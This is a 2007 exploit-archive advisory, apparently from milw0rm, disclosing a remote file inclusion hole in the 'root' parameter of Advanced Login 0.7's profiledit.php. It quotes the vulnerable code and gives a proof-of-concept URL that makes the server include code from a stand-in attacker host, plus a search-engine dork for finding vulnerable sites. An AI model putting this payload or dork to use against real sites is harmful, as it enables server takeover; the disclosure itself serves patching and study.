@@ -1,0 +1,81 @@
+------------------------------------------------------------------------------
+Advanced Login <= 0.7 (root) Remote File Inclusion Vulnerability
+------------------------------------------------------------------------------
+
+Author		: Zeni Susanto a.k.a Bithedz
+Date Found	: Maret, 29th 2007
+Location	: Indonesia, Bandung
+Critical Lvl	: Highly critical
+Impact		: System access
+Where		: From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~
+Application	: AdvanceLogin
+version		: 0.7
+vendor		: http://www.msxstudios.de
+source url      : http://downloads.msxstudios.de/advancedlogin076.zip
+
+---------------------------------------------------------------------------
+
+Description:
+~~~~~~~~
+Advanced Login is at present for designers the best, for programmers and successful Web masters one the best Login of systems on the market. Templates which can be edited through simply and determined Functions can adapt you to Advanced Login 100% to YOUR Design, not as differently with usual systems around. Advanced Login is developed further and improved, an installation is constantly worthwhile themselves thus, even if the present function yet for your web page are not enough completely.
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~
+
+I found vulnerability script in profiledit.php
+
+---------- profiledit.php---------------------------------------------------------
+<?php
+include($root."login/engine/couple.php");
+mysql_query($profil_update_sql);
+$result2=mysql_query($select_new_user_sql);
+$row2=mysql_fetch_assoc($result2);
+?>
+ 
+-----------------------------------------------------------------------------
+
+Input passed to the "root" parameter in profiledit.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources.
+
+
+
+Proof Of Concept:
+~~~~~~~~~~~~
+
+http://target.com/login/engine/db/profiledit.php?root==http://attact.com/colok.txt?
+
+-----------------------------------------------------------------------------
+
+google d0rk:
+~~~~~~~
+"Advanced Login - Login"
+
+-----------------------------------------------------------------------------
+Solution:
+~~~
+- download new version in vendor URL 
+
+-----------------------------------------------------------------------------
+Shoutz:
+~~
+~ My Wife Monik 
+~ K-159
+
+-----------------------------------------------------------------------------
+
+Contact:
+~~~
+ 
+     Bithedz[at]gmail[dot]com
+     
+-------------------------------- [ EOF ]----------------------------------
+
+# milw0rm.com [2007-03-29]
